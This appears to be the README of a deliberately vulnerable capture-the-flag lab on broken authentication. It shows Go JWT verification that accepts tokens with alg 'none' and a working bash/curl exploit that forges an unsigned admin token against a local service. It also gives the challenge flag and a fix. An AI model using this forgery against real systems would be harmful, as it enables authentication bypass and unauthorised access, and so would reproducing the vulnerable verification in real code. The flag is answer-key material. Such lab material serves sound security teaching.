# A07: Identification and Authentication Failures

⚠️ **Intentionally vulnerable — do not deploy to a real network or reuse this code.**

## Scenario

A token-based dashboard. Demo login `alice / alice123` gets you a token —
but `alice` isn't an admin, and there's no admin account to log in as.

## The bug

`verifyToken` trusts the `alg` field from the attacker-supplied token header
instead of pinning to one algorithm:

```go
switch hdr.Alg {
case "HS256":
    // ... verifies signature ...
case "none":
    // BUG: no signature check at all for this branch.
}
```

A JWT with `"alg":"none"` and an empty signature is accepted as valid,
because nothing ever checks the signature for that branch.

## Exploit

Forge a token by hand — no signing key needed:

```bash
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(printf '{"username":"admin","isAdmin":true}' | base64 | tr -d '=' | tr '+/' '-_')
TOKEN="${HEADER}.${PAYLOAD}."   # trailing dot, empty signature

curl -s http://localhost:9007/api/flag -H "Authorization: Bearer $TOKEN"
```

## Flag

`CTF{a07_alg_n0n3_jwt_f0rg3ry}`

## The fix (for reference)

Never let the token pick its own verification algorithm. Pin one algorithm
server-side and reject anything else — see `platform/internal/auth/jwt.go`'s
use of `jwt.WithValidMethods([]string{"HS256"})`.
